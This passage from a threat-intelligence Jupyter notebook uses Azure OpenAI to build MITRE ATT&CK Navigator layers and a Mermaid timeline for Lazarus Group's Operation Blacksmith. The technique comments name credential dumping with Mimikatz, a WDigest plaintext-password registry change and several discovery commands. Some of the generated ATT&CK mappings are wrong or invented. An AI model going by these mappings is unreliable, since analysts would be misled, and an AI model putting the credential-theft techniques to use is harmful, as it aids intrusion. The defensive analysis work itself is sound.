        "<p>The prompt uses the one-shot example technique with the information provided by variables *+'prompt_response'+* and *+'prompt_table'+*, which you can read in the code below. Feel free to modify to experiment with different approaches..</p>\n",
        "</div>"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#provide Mitre Attack layer json file\n",
        "import os\n",
        "import json\n",
        "from openai import AzureOpenAI\n",
        "from uuid import uuid4\n",
        "from dotenv import load_dotenv\n",
        "\n",
        "load_dotenv(\"OAIcanada.env\")\n",
        "\n",
        "client = AzureOpenAI(\n",
        "  azure_endpoint = os.getenv(\"AZURE_OPENAI_ENDPOINT\"), \n",
        "  api_key=os.getenv(\"AZURE_OPENAI_KEY\"),  \n",
        "  api_version=\"2023-05-15\"\n",
        ")\n",
        "\n",
        "prompt_table = \"\"\"\n",
        "| Technique                                | Technique ID | Tactic           | Comment                                                                                                      |\n",
        "|------------------------------------------|--------------|------------------|--------------------------------------------------------------------------------------------------------------|\n",
        "| Used CVE-2021-44228 for initial access.   | T1190        | Initial Access   | Used CVE-2021-44228 to exploit publicly exposed servers for initial access.                                  |\n",
        "| Used commands and scripts for execution.  | T1059        | Execution        | Used commands and scripts (like PowerShell and BAT) to execute different operations.                         |\n",
        "| Used NineRAT for persistence.             | T1543        | Persistence      | Used NineRAT to set up persistence by creating services using BAT scripts.                                     |\n",
        "| NineRAT dropper deletes itself for defense evasion. | T1140 | Defense Evasion  | NineRAT has a dropper binary containing two other components, written to disk, and the dropper deletes itself to avoid detection. |\n",
        "| Used Telegram for command and control.   | T1102        | Command and Control | Used Telegram bots and channels for C2 communications.                                                       |\n",
        "| Used commands for system information discovery. | T1082 | Discovery        | Used commands like \"whoami,\" \"ver,\" \"getmac\" for system information discovery.                                |\n",
        "| Used NineRAT for data collection.         | T1005        | Collection       | NineRAT is used to collect data from the local system.                                                        |\n",
        "\"\"\"\n",
        "\n",
        "prompt_response = \"\"\"\n",
        "{\n",
        "  \"name\": \"Lazarus Group TTPs\",\n",
        "  \"versions\": {\n",
        "    \"attack\": \"14\",\n",
        "    \"navigator\": \"4.9.1\",\n",
        "    \"layer\": \"4.5\"\n",
        "  },\n",
        "  \"domain\": \"enterprise-attack\",\n",
        "  \"description\": \"TTPs identified in Lazarus Group's Operation Blacksmith\",\n",
        "  \"filters\": {\n",
        "    \"platforms\": [\"windows\"]\n",
        "  },\n",
        "  \"sorting\": 0,\n",
        "  \"layout\": {\n",
        "    \"layout\": \"side\",\n",
        "    \"aggregateFunction\": \"average\",\n",
        "    \"showID\": false,\n",
        "    \"showName\": true,\n",
        "    \"showAggregateScores\": false,\n",
        "    \"countUnscored\": false,\n",
        "    \"expandedSubtechniques\": \"none\"\n",
        "  },\n",
        "  \"hideDisabled\": false,\n",
        "  \"techniques\": [\n",
        "    {\n",
        "      \"techniqueID\": \"T1190\",\n",
        "      \"tactic\": \"initial-access\",\n",
        "      \"color\": \"\",\n",
        "      \"comment\": \"Used CVE-2021-44228 to exploit publicly exposed servers for initial access.\",\n",
        "      \"enabled\": true,\n",
        "      \"metadata\": [],\n",
        "      \"links\": [],\n",
        "      \"showSubtechniques\": false\n",
        "    },\n",
        "    {\n",
        "      \"techniqueID\": \"T1059\",\n",
        "      \"tactic\": \"execution\",\n",
        "      \"color\": \"\",\n",
        "      \"comment\": \"Used commands and scripts (like PowerShell and BAT) to execute different operations\",\n",
        "      \"enabled\": true,\n",
        "      \"metadata\": [],\n",
        "      \"links\": [],\n",
        "      \"showSubtechniques\": false\n",
        "    },\n",
        "    {\n",
        "      \"techniqueID\": \"T1543\",\n",
        "      \"tactic\": \"persistence\",\n",
        "      \"color\": \"\",\n",
        "      \"comment\": \"Used NineRAT to set up persistence by creating services using BAT scripts.\",\n",
        "      \"enabled\": true,\n",
        "      \"metadata\": [],\n",
        "      \"links\": [],\n",
        "      \"showSubtechniques\": false\n",
        "    },\n",
        "    {\n",
        "      \"techniqueID\": \"T1140\",\n",
        "      \"tactic\": \"defense-evasion\",\n",
        "      \"color\": \"\",\n",
        "      \"comment\": \"NineRAT has a dropper binary containing two other components, which are written to disk and the dropper deletes itself to avoid detection.\",\n",
        "      \"enabled\": true,\n",
        "      \"metadata\": [],\n",
        "      \"links\": [],\n",
        "      \"showSubtechniques\": false\n",
        "    },\n",
        "    {\n",
        "      \"techniqueID\": \"T1102\",\n",
        "      \"tactic\": \"command-and-control\",\n",
        "      \"color\": \"\",\n",
        "      \"comment\": \"Used Telegram bots and channels for C2 communications.\",\n",
        "      \"enabled\": true,\n",
        "      \"metadata\": [],\n",
        "      \"links\": [],\n",
        "      \"showSubtechniques\": false\n",
        "    },\n",
        "    {\n",
        "      \"techniqueID\": \"T1082\",\n",
        "      \"tactic\": \"discovery\",\n",
        "      \"color\": \"\",\n",
        "      \"comment\": \"Used commands like \\\"whoami\\\", \\\"ver\\\", \\\"getmac\\\" for system information discovery.\",\n",
        "      \"enabled\": true,\n",
        "      \"metadata\": [],\n",
        "      \"links\": [],\n",
        "      \"showSubtechniques\": false\n",
        "    },\n",
        "    {\n",
        "      \"techniqueID\": \"T1005\",\n",
        "      \"tactic\": \"collection\",\n",
        "      \"color\": \"\",\n",
        "      \"comment\": \"NineRAT is used to collect data from the local system.\",\n",
        "      \"enabled\": true,\n",
        "      \"metadata\": [],\n",
        "      \"links\": [],\n",
        "      \"showSubtechniques\": false\n",
        "    }\n",
        "  ],\n",
        "  \"gradient\": {\n",
        "    \"colors\": [\"#ff6666\", \"#ffe766\", \"#8ec843\"],\n",
        "    \"minValue\": 0,\n",
        "    \"maxValue\": 100\n",
        "  },\n",
        "  \"legendItems\": [],\n",
        "  \"metadata\": [],\n",
        "  \"links\": [],\n",
        "  \"showTacticRowBackground\": false,\n",
        "  \"tacticRowBackground\": \"#dddddd\"\n",
        "}\n",
        "\"\"\"\n",
        "\n",
        "#Function to provide ATT&CK Matrix for Enterprise layer json file\n",
        "def attack_layer(ttptable):\n",
        "  response = client.chat.completions.create(\n",
        "      model=os.getenv(\"DEPLOYMENT_NAME\"), # model = \"deployment_name\" \n",
        "      messages=[\n",
        "                  {\n",
        "                      \"role\": \"system\",\n",
        "                      \"content\": f\"You are tasked with creating an ATT&CK Matrix for Enterprise layer json file with attack version 14, navigator 4.9.1, layer version 4.5 to load a layer in MITRE ATT&CK Navigator. Use {ttptable} as input. Print just json content, avoiding ncluding any additional text in the response. In domain filed use enterprise-attack.\"\n",
        "                  },\n",
        "                  {\n",
        "                      \"role\":\"user\",\n",
        "                      \"content\":f\"Title:  Enterprise techniques used by 2015 Ukraine Electric Power Attack, ATT&CK campaign C0028 (v1.0): Table: {prompt_table}\"\n",
        "                  },\n",
        "                  {\n",
        "                      \"role\":\"assistant\",\n",
        "                      \"content\":f\"{prompt_response}\"\n",
        "                  }\n",
        "              ]\n",
        "  )\n",
        "  return response.choices[0].message.content\n",
        "\n",
        "mitre_layer = attack_layer(ttptable)\n",
        "print(mitre_layer)\n",
        "\n",
        "# Generate a unique ID for the file name\n",
        "unique_id = str(uuid4())\n",
        "\n",
        "# Define the file path with a unique ID\n",
        "file_path = os.path.join(\"mitrelayers\", f\"mitre-attack-navigator-{unique_id}.json\")\n",
        "\n",
        "# Write ttptable content to the file\n",
        "with open(file_path, 'w') as json_file:\n",
        "    json_file.write(mitre_layer)\n",
        "\n",
        "# Print the file path for reference\n",
        "print(f\"Content written to: {file_path}\")"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": "{\n  \"name\": \"Lazarus Group TTPs\",\n  \"description\": \"\",\n  \"domain\": \"enterprise-attack\",\n  \"versions\": {\n    \"attack\": \"14\",\n    \"navigator\": \"4.9.1\",\n    \"layer\": \"4.5\"\n  },\n  \"techniques\": [\n    {\n      \"techniqueID\": \"T1219\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Lazarus Group used Telegram-based RATs to target organizations worldwide\",\n      \"tactic\": \"command-and-control\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1203\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Lazarus Group exploited CVE-2021-44228 (Log4j) vulnerability known as Log4Shell for initial access\",\n      \"tactic\": \"execution\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1082\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"NineRAT collects information about the infected system\",\n      \"tactic\": \"discovery\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1005\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Lazarus actors used 'dir /a c:\\\\users' command to overview disk structure\",\n      \"tactic\": \"discovery\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1518\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"NineRAT checked for installed security software\",\n      \"tactic\": \"discovery\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1059\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Used to execute programs via command line\",\n      \"tactic\": \"execution\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"use-of-telegram-for-command-and-control\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Novel technique used by Lazarus Group where Telegram was used as a C2 channel\",\n      \"tactic\": \"command-and-control\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1027\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Processed obfuscated data via base64 encoding\",\n      \"tactic\": \"defense-evasion\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1569\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Execution of malware through services\",\n      \"tactic\": \"execution\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1112\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Modification of the registry key HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\Wdigest to save passwords in plaintext\",\n      \"tactic\": \"persistence\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1482\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Used 'net group /domain Domain Computers' command to list all computers in a domain\",\n      \"tactic\": \"discovery\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1016\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Used 'ipconfig /all' command to obtain network configuration of the system\",\n      \"tactic\": \"discovery\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1136\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Creation of a new user account with administrative privileges\",\n      \"tactic\": \"persistence\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1214\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Used Procdump and Mimikatz utilities to collect credentials\",\n      \"tactic\": \"credential-access\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1048\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Used to transfer files into the infected network.\",\n      \"tactic\": \"command-and-control\",\n      \"enabled\": true\n    },\n    {\n      \"techniqueID\": \"T1562\",\n      \"color\": \"#ABABAB\",\n      \"comment\": \"Removal of security tools to evade detection\",\n      \"tactic\": \"defense-evasion\",\n      \"enabled\": true\n    }\n  ],\n  \"gradient\": {\n    \"colors\": [\n      \"#ffffff\",\n      \"#ff6666\"\n    ],\n    \"minValue\": 0,\n    \"maxValue\": 1\n  },\n  \"legendItems\": [],\n  \"metadata\": [],\n  \"showTacticRowBackground\": false,\n  \"tacticRowBackground\": \"#dddddd\",\n  \"selectTechniquesAcrossTactics\": true\n}\nContent written to: mitrelayers/mitre-attack-navigator-b9d18bd6-25a9-45ef-8a29-b445e76b88b8.json\n"
        }
      ],
      "execution_count": 4,
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1705358099670
        },
        "collapsed": false
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 5 **Navigating Threats** - Uploading to Mitre Attack Navigator\n",
        "\n",
        "In this part, the code handles the integration of cyber threat intelligence by uploading the generated MITRE ATT&CK® Navigator Layer to Azure Blob Storage. \n",
        "This step is crucial for sharing and visualizing threat data across different platforms.\n",
        "\n",
        "The ATT&CK Navigator is a web-based tool for annotating and exploring ATT&CK matrices. It can be used to visualize defensive coverage, red/blue team planning, the frequency of detected techniques, and more. \n",
        "\n",
        "The most effective and fast way I found to visualize the MITRE ATT&CK® Navigator Layer in the notebook was to publish the JSON file (representing the Mitre layer) to Azure Storage Account and load the layer directly onto the online tool [https://mitre-attack.github.io/attack-navigator/](https://mitre-attack.github.io/attack-navigator/). \n",
        "\n",
        "<div style=\"border: solid; padding: 5pt\">\n",
        "<b>Notes: </b>\n",
        "<p>It is recommended to modify the connection parameters of your Storage Account.</p>\n",
        "</div>\n",
        "\n",
        "<div style=\"color: Black; background-color: LightGoldenRodYellow; padding: 10px; font-size: 18px; line-height: 1.4;\">\n",
        "    <p>Make sure you have defined a .env file with all the following data:</p>\n",
        "    <ul style=\"font-size: 14px;\">\n",
        "        <li>AZURE_CLIENT_ID</li>\n",
        "        <li>AZURE_TENANT_ID</li>\n",
        "        <li>AZURE_CLIENT_SECRET</li>\n",
        "    </ul>\n",
        "</div>"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#Upload of the previously defined Mitre Attack Navigator layer. \n",
        "from azure.storage.blob import BlobServiceClient\n",
        "from azure.identity import DefaultAzureCredential\n",
        "from dotenv import load_dotenv\n",
        "import os\n",
        "\n",
        "print(\"Loading environment variables from .env file\")\n",
        "load_dotenv(\"OAIcanada.env\")\n",
        "\n",
        "# Create a credential object\n",
        "credential = DefaultAzureCredential()\n",
        "\n",
        "# Specify the URL of the Azure Storage account\n",
        "account_url = \"https://mitrenavigator.blob.core.windows.net/\"\n",
        "\n",
        "# Create a blob service client using account_url\n",
        "blob_service_client = BlobServiceClient(account_url=account_url, credential=credential)\n",
        "\n",
        "# Upload the file to a container named \"layers\"\n",
        "# Blob Storage container name\n",
        "container_name = \"layers\"\n",
        "\n",
        "# Blob name and local file path\n",
        "blob_name = f\"mitre-attack-navigator-{unique_id}.json\"\n",
        "local_file_path = os.path.join(\"mitrelayers\", f\"mitre-attack-navigator-{unique_id}.json\")\n",
        "print(blob_name)\n",
        "\n",
        "try:\n",
        "    # Upload the file\n",
        "    with open(local_file_path, \"rb\") as f:\n",
        "        blob_client = blob_service_client.get_blob_client(container=container_name, blob=blob_name)\n",
        "        blob_client.upload_blob(f.read())\n",
        "\n",
        "    # Check if the file has been uploaded\n",
        "    exists = blob_client.exists()\n",
        "    print(f\"File {blob_name} uploaded successfully: {exists}\")\n",
        "\n",
        "except Exception as e:\n",
        "    # Print the exception details for debugging\n",
        "    print(f\"Error: {e}\")\n",
        "    raise e"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": "Loading environment variables from .env file\nmitre-attack-navigator-b9d18bd6-25a9-45ef-8a29-b445e76b88b8.json\nFile mitre-attack-navigator-b9d18bd6-25a9-45ef-8a29-b445e76b88b8.json uploaded successfully: True\n"
        }
      ],
      "execution_count": 5,
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1705358130780
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 6 **Visualizing Threat Landscape** - Displaying Mitre Attack Navigator Layer\n",
        "\n",
        "This section employs the IPython IFrame to display the uploaded MITRE ATT&CK® Navigator Layer interactively. \n",
        "\n",
        "It provides a user-friendly interface for exploring and understanding the identified threat landscape.\n"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from IPython.display import IFrame\n",
        "print(f\"mitre-attack-navigator-{unique_id}.json\")\n",
        "# The iframe URL\n",
        "iframe_url = (\n",
        "    \"https://mitre-attack.github.io/attack-navigator/\"\n",
        "    \"#layerURL=https%3A%2F%2Fmitrenavigator.blob.core.windows.net\"\n",
        "    f\"%2Flayers%2F{blob_name}\"\n",
        ")\n",
        "\n",
        "# Create the IFrame\n",
        "iframe = IFrame(src=iframe_url, width=\"100%\", height=600)\n",
        "\n",
        "# Display the IFrame\n",
        "iframe"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": "mitre-attack-navigator-b9d18bd6-25a9-45ef-8a29-b445e76b88b8.json\n"
        },
        {
          "output_type": "execute_result",
          "execution_count": 6,
          "data": {
            "text/plain": "<IPython.lib.display.IFrame at 0x7f6acfe028b0>",
            "text/html": "\n        <iframe\n            width=\"100%\"\n            height=\"600\"\n            src=\"https://mitre-attack.github.io/attack-navigator/#layerURL=https%3A%2F%2Fmitrenavigator.blob.core.windows.net%2Flayers%2Fmitre-attack-navigator-b9d18bd6-25a9-45ef-8a29-b445e76b88b8.json\"\n            frameborder=\"0\"\n            allowfullscreen\n            \n        ></iframe>\n        "
          },
          "metadata": {}
        }
      ],
      "execution_count": 6,
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1705358172835
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 7 **Visualization of the Attack Path** - Generating an Attack Timeline with Mermaid\n",
        "\n",
        "This section is dedicated to visualizing the attack path of a cyber threat. Leveraging Azure OpenAI, the code generates a list of Tactics and Subtactics ordered by execution time based on the provided Threat Intelligence and Tactics, Techniques, and Procedures (TTPs) table. The output is a clear and structured representation of the chronological sequence of cyber threat actions.\n",
        "\n",
        "Following this, the code uses Mermaid.js to create an illustrative timeline graph of the attack stages. The timeline graph is constructed based on the provided TTPs timeline and Mermaid.js code, offering a visual narrative of the key events and tactics employed during the cyber attack. This visualization aids in understanding the progression of the attack, providing valuable insights for threat analysis and mitigation.\n",
        "\n",
        "<div style=\"border: solid; padding: 5pt\">\n",
        "<b>Notes: </b>\n",
        "<p>Ensure that the provided 'text' and 'ttptable' variables contain valid data related to the cyber threat intelligence analysis.</p>\n",
        "</div>\n",
        "\n",
        "The Mermaid.js timeline code generated serves as a visual representation of the attack path and should be used within a compatible environment or viewer that supports Mermaid.js syntax."
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#Visualization of the attack path\n",
        "import os\n",
        "from openai import AzureOpenAI\n",
        "from dotenv import load_dotenv\n",
        "\n",
        "load_dotenv(\"OAIcanada.env\")\n",
        "\n",
        "# Set up OpenAI client\n",
        "client = AzureOpenAI(\n",
        "  azure_endpoint = os.getenv(\"AZURE_OPENAI_ENDPOINT\"), \n",
        "  api_key=os.getenv(\"AZURE_OPENAI_KEY\"),  \n",
        "  api_version=\"2023-05-15\"\n",
        "\n",
        ")\n",
        "\n",
        "#Function to provide a list of TTPs order by execution time\n",
        "def ttp_list(text, ttptable):\n",
        "    response = client.chat.completions.create(\n",
        "        model=os.getenv(\"DEPLOYMENT_NAME\"), # model = \"deployment_name\"\n",
        "        messages=[\n",
        "            {\"role\": \"system\", \"content\": \"You are an AI assistant expert in cybersecurity, threat intelligence, and Mitre attack, assisting Infosec professionals in understanding cyber attacks.\"},\n",
        "            {\"role\": \"user\", \"content\": f\"Based on {text} and {ttptable} provide a list of TTPs order by execution time, Each line must include only Tactic and Subtactic, IDs between brackets after subtactic.\"}\n",
        "        ]\n",
        "    )\n",
        "\n",
        "    return response.choices[0].message.content\n",
        "\n",
        "attackpath = ttp_list(text, ttptable)\n",
        "print(attackpath)\n",
        "\n",
        "ttps_timeline = \"\"\"\n",
        "1. Initial Access: Exploitation of Remote Services [T1210]\n",
        "2. Execution: Command and Scripting Interpreter: PowerShell [T1059.001]  \n",
        "3. Persistence: External Remote Services [T1133]\n",
        "4. Persistence: Server Software Component: Web Shell [T1505.003]\n",
        "5. Persistence: Account Creation [T1136]\n",
        "6. Defense Evasion: Use Alternate Authentication Material [T1550]\n",
        "7. Defense Evasion: Modify Registry [T1112]\n",
        "8. Defense Evasion: Indicator Removal on Host: File Deletion [T1070.004]\n",
        "9. Credential Access: OS Credential Dumping [T1003]\n",
        "10. Discovery: System Information Discovery [T1082]\n",
        "11. Collection: Data Staged: Local Data Staging [T1074.001]\n",
        "12. Command and Control: Remote Access Tools [-]\n",
        "13. Command and Control: Proxy: Multi-hop Proxy [T1090.003]\n",
        "14. Command and Control: Application Layer Protocol: Web Protocols [T1071.001]\n",
        "15. Command and Control: Ingress Tool Transfer [T1105]\n",
        "16. Impact: Data Encrypted for Impact [T1486]\n",
        "\"\"\"\n",
        "\n",
        "mermaid_timeline = \"\"\"\n",
        "timeline\n",
        "title Lazarus Group Operation Blacksmith\n",
        "    Initial Access\n",
        "    : Exploitation of Remote Services - [T1210]\n",
        "\tExecution\n",
        "    : Command and Scripting Interpreter - PowerShell - [T1059.001]  \n",
        "    Persistence\n",
        "    : External Remote Services - [T1133]\n",
        "\t: Server Software Component - Web Shell - [T1505.003]\n",
        "\t: Account Creation - [T1136]\n",
        "\tDefense Evasion\n",
        "\t: Use Alternate Authentication Material - [T1550]\n",
        "\t: Modify Registry - [T1112]\n",
        "\t: Indicator Removal on Host - File Deletion - [T1070.004]\n",
        "\tCredential Access\n",
        "    : OS Credential Dumping - [T1003]\n",
        "    Discovery\n",
        "    : System Information Discovery - [T1082]\n",
        "    Collection: Data Staged - Local Data Staging - [T1074.001]\n",
        "\tCommand and Control\n",
        "    : Remote Access Tools - [-]\n",
        "    : Proxy Multi-hop Proxy - [T1090.003]\n",
        "    : Application Layer Protocol Web Protocols - [T1071.001]\n",
        "\t: Ingress Tool Transfer - [T1105]\n",
        "    Impact: Data Encrypted for Impact - [T1486]\n",
        "\"\"\"\n",
        "\n",
        "#Function to generate attack timeline Mermaid.jc code \n",
        "def ttp_graph_timeline(ttps_timeline, mermaid_timeline):\n",
        "    response = client.chat.completions.create(\n",
        "        model=\"gpt4-af-demo\", \n",
        "        messages=[\n",
        "                    {\n",
        "                        \"role\":\"user\",\n",
        "                        \"content\":f\"Write a Mermaid.js timeline graph that illustrates the stages of a cyber attack. As an example condider the Lazarus Group's operation named Operation Blacksmith, whose Tactics, Techniques, and Procedures (TTPs) timeline is as follows: {ttps_timeline}, and related meirmad.js code is: {mermaid_timeline}. Use the following guidalines to generate code: \\n1. timeline: This keyword starts the timeline graph definition, \\n2. title: This keyword is followed by the title of the timeline graph, \\n3. Each timeline step is defined on a separate line and starts with a description of the step. The description should be concise and informative, summarizing the key actions or events of the step, \\n4. The description is followed by a colon (:) and then the step details, \\n5. The step details can include any additional information about the step, such as the specific tools or techniques used. \\n6. Optionally, the step details can include a reference to a malleable threat technique ID using square brackets. \\n7 avoid provide days after TTP ID. \\n8 Provide just mermaid.js code without any other text. \\n9 start code with timeline- \\n10 don't use any bracket at the benning and the end of your output \"\n",
        "                    }\n",
        "                ]    \n",
        "    )\n",
        "\n",
        "    return response.choices[0].message.content\n",
        "\n",
        "mermaid_timeline = ttp_graph_timeline(ttps_timeline, mermaid_timeline)\n",
        "print(mermaid_timeline)\n"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": "Here is the list of TTPs sorted by execution time:\n\n1. Exploitation for Client Execution [T1203] - Initial Access\n2. System Information Discovery [T1082] - Discovery\n3. Disk Structure Discovery [T1005] - Discovery\n4. Command-Line Interface [T1059] - Execution\n5. Modify Registry [T1112] - Defense Evasion, Persistence\n6. Software Discovery [T1518] - Discovery\n7. Domain Trust Discovery [T1482] - Discovery\n8. System Network Configuration Discovery [T1016] - Discovery\n9. Account Creation [T1136, T1098] - Persistence, Defense Evasion\n10. Credentials in Registry [T1214] - Credential Access\n11. Use of Telegram for Command & Control [No ID Available] - Command and Control\n12. Data Obfuscation [T1027] - Defense Evasion\n13. Service Exec [T1569] - Execution\n14. Remote Access Trojan [T1219] - Command and Control\n15. File Transfer Protocols [T1048] - Command and Control\n16. Impair Defenses [T1562] - Defense Evasion\ntimeline\ntitle Lazarus Group Operation Blacksmith\n    Initial Access: Exploitation of Remote Services - [T1210]\n\tExecution: Command and Scripting Interpreter - PowerShell - [T1059.001]  \n    Persistence: External Remote Services - [T1133]\n    Persistence: Server Software Component - Web Shell - [T1505.003]\n\tPersistence: Account Creation - [T1136]\n\tDefense Evasion: Use Alternate Authentication Material - [T1550]\n\tDefense Evasion: Modify Registry - [T1112]\n\tDefense Evasion: Indicator Removal on Host - File Deletion - [T1070.004]\n\tCredential Access: OS Credential Dumping - [T1003]\n    Discovery: System Information Discovery - [T1082]\n    Collection: Data Staged - Local Data Staging - [T1074.001]\n\tCommand and Control: Remote Access Tools\n    Command and Control: Proxy: Multi-hop Proxy - [T1090.003]\n    Command and Control: Application Layer Protocol: Web Protocols - [T1071.001]\n\tCommand and Control: Ingress Tool Transfer - [T1105]\n    Impact: Data Encrypted for Impact - [T1486]\n"
        }
      ],
      "execution_count": 7,
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1705358217433
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 8 **Cyber Attack Timeline Visualization** using markdown-inspired tool\n",
        "\n",
        "This section utilizes Mermaid.js to create an interactive and visually appealing timeline graph representing the stages of a cyber attack. Mermaid is a Markdown-inspired tool that renders text into diagrams\n",
        "\n",
        "The code takes the generated Mermaid.js timeline code as input and converts it into a base64-encoded image. The resulting image is then displayed using IPython's Image module.\n",
        "\n",
        "The purpose of this code is to provide an interactive and graphical representation of the cyber attack timeline, enhancing the understanding of the chronological sequence of events, tactics, and techniques involved in the cyber threat scenario. The visualization aids cybersecurity professionals and analysts in comprehending the flow of the attack, facilitating more effective threat analysis and response.\n",
        "\n",
        "<div style=\"border: solid; padding: 5pt\">\n",
        "<b>Notes: </b>\n",
        "<p>Ensure that the mermaid_timeline variable contains valid Mermaid.js code generated from the previous sections of the notebook. The code is designed to be executed in a Jupyter Notebook environment, leveraging the capabilities of IPython to display the generated timeline image.</p>\n",
        "</div>"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#Mermaid.js cyber attack timeline\n",
        "import base64\n",
        "from IPython.display import Image, display\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "def generate_timeline(graph):\n",
        "    graphbytes = graph.encode(\"utf8\")\n",
        "    base64_bytes = base64.b64encode(graphbytes)\n",
        "    base64_string = base64_bytes.decode(\"ascii\")\n",
        "    display(Image(url=\"https://mermaid.ink/img/\" + base64_string))\n",
        "\n",
        "generate_timeline(mermaid_timeline)"
      ],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<img src=\"https://mermaid.ink/img/dGltZWxpbmUKdGl0bGUgTGF6YXJ1cyBHcm91cCBPcGVyYXRpb24gQmxhY2tzbWl0aAogICAgSW5pdGlhbCBBY2Nlc3M6IEV4cGxvaXRhdGlvbiBvZiBSZW1vdGUgU2VydmljZXMgLSBbVDEyMTBdCglFeGVjdXRpb246IENvbW1hbmQgYW5kIFNjcmlwdGluZyBJbnRlcnByZXRlciAtIFBvd2VyU2hlbGwgLSBbVDEwNTkuMDAxXSAgCiAgICBQZXJzaXN0ZW5jZTogRXh0ZXJuYWwgUmVtb3RlIFNlcnZpY2VzIC0gW1QxMTMzXQogICAgUGVyc2lzdGVuY2U6IFNlcnZlciBTb2Z0d2FyZSBDb21wb25lbnQgLSBXZWIgU2hlbGwgLSBbVDE1MDUuMDAzXQoJUGVyc2lzdGVuY2U6IEFjY291bnQgQ3JlYXRpb24gLSBbVDExMzZdCglEZWZlbnNlIEV2YXNpb246IFVzZSBBbHRlcm5hdGUgQXV0aGVudGljYXRpb24gTWF0ZXJpYWwgLSBbVDE1NTBdCglEZWZlbnNlIEV2YXNpb246IE1vZGlmeSBSZWdpc3RyeSAtIFtUMTExMl0KCURlZmVuc2UgRXZhc2lvbjogSW5kaWNhdG9yIFJlbW92YWwgb24gSG9zdCAtIEZpbGUgRGVsZXRpb24gLSBbVDEwNzAuMDA0XQoJQ3JlZGVudGlhbCBBY2Nlc3M6IE9TIENyZWRlbnRpYWwgRHVtcGluZyAtIFtUMTAwM10KICAgIERpc2NvdmVyeTogU3lzdGVtIEluZm9ybWF0aW9uIERpc2NvdmVyeSAtIFtUMTA4Ml0KICAgIENvbGxlY3Rpb246IERhdGEgU3RhZ2VkIC0gTG9jYWwgRGF0YSBTdGFnaW5nIC0gW1QxMDc0LjAwMV0KCUNvbW1hbmQgYW5kIENvbnRyb2w6IFJlbW90ZSBBY2Nlc3MgVG9vbHMKICAgIENvbW1hbmQgYW5kIENvbnRyb2w6IFByb3h5OiBNdWx0aS1ob3AgUHJveHkgLSBbVDEwOTAuMDAzXQogICAgQ29tbWFuZCBhbmQgQ29udHJvbDogQXBwbGljYXRpb24gTGF5ZXIgUHJvdG9jb2w6IFdlYiBQcm90b2NvbHMgLSBbVDEwNzEuMDAxXQoJQ29tbWFuZCBhbmQgQ29udHJvbDogSW5ncmVzcyBUb29sIFRyYW5zZmVyIC0gW1QxMTA1XQogICAgSW1wYWN0OiBEYXRhIEVuY3J5cHRlZCBmb3IgSW1wYWN0IC0gW1QxNDg2XQ==\"/>",
            "text/plain": "<IPython.core.display.Image object>"
          },
          "metadata": {}
        }
      ],
